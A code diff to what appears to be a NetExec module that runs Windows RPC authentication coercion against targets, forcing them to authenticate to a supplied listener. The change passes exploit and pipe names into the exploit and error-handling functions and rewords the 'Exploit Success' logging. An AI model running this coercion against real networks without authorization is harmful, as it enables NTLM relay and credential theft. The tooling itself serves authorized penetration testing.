@@ -73,17 +73,15 @@ class NXCModule:
                     )
                     if dce is not None:
                         accessible_Pipe.append(coerce_method["pipeName"])
-                        """
-                        context.log.debug(f"PIPE: {ms_protocolName} is accessible on target: {target}")
-                        context.log.highlight(f"PIPE: {ms_protocolName}")
-                         """
                         if self.listener is not None:  # exploit
                             testCoercer.exploit(
                                 dce=dce,
                                 target=target,
                                 listener=self.listener,
                                 always_continue=self.always_continue,
-                                ms_protocolName=ms_protocolName
+                                ms_protocolName=ms_protocolName,
+                                exploitName=aliasName[ms_protocolName],
+                                pipeName=coerce_method["pipeName"]
                             )
                         dce.disconnect()
                     else:
@@ -211,7 +209,7 @@ class Coercer:
         self.context.log.debug("[+] Successfully bound!")
         return dce
     
-    def exploit(self, dce, target, listener, always_continue, ms_protocolName):
+    def exploit(self, dce, target, listener, always_continue, ms_protocolName, exploitName, pipeName):
         for method in self.methods:
             ProtocolName = method.__package__
             CoerceMethod = method.__name__.split(".")[1]
@@ -220,15 +218,15 @@ class Coercer:
                 try:
                     method.request(dce, target, listener)
                 except Exception as e:
-                    self.handle_exception(CoerceMethod, ProtocolName, always_continue, e)
+                    self.handle_exception(CoerceMethod, exploitName, pipeName, always_continue, e)
     
-    def handle_exception(self, CoerceMethod, ProtocolName, always_continue, e):
+    def handle_exception(self, CoerceMethod, exploitName, pipeName, always_continue, e):
         if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
-            self.context.log.debug(f"{CoerceMethod} Success")
-            self.context.log.highlight(f"Exploit Success, {ProtocolName}\\{CoerceMethod}")
+            self.context.log.debug(f"{exploitName}: Exploit Success with {CoerceMethod} method")
+            self.context.log.highlight(f"{exploitName}: Exploit Success, {pipeName}\\{CoerceMethod}")
             if not always_continue:
                 return True
         elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
-            self.context.log.debug("Not Vulnerable")
+            self.context.log.debug(f"{exploitName}: Not Vulnerable")
         else:
             self.context.log.debug(f"Something went wrong, check error status => {e!s}")
